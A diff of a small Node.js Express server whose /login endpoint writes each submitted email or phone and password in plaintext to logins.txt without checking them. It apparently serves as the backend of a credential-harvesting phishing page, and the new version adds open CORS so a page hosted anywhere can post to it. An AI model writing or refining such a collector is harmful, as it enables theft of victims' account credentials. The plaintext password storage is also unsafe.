@@ -1,26 +1,21 @@
 const express = require('express');
-const bodyParser = require('body-parser');
 const fs = require('fs');
-
+const bodyParser = require('body-parser');
+const cors = require('cors');
 const app = express();
-app.use(bodyParser.urlencoded({ extended: true }));
+const PORT = process.env.PORT || 3000;
 
-// Serve static files like your HTML
-app.use(express.static('public'));
+app.use(cors());
+app.use(bodyParser.json());
 
 app.post('/login', (req, res) => {
   const { email, password } = req.body;
-  const entry = `Email/Phone: ${email}, Password: ${password}\n`;
-  
-  fs.appendFile('logins.txt', entry, err => {
-    if (err) {
-      console.error('Error writing to file:', err);
-      return res.status(500).send('Server error');
-    }
-    res.send('Login received'); // Can redirect to another page if needed
+  const log = `Email: ${email}, Password: ${password}\n`;
+
+  fs.appendFile('logins.txt', log, (err) => {
+    if (err) return res.status(500).send('Error saving data.');
+    res.send('Login recorded.');
   });
 });
 
-app.listen(3000, () => {
-  console.log('Server running at http://localhost:3000');
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
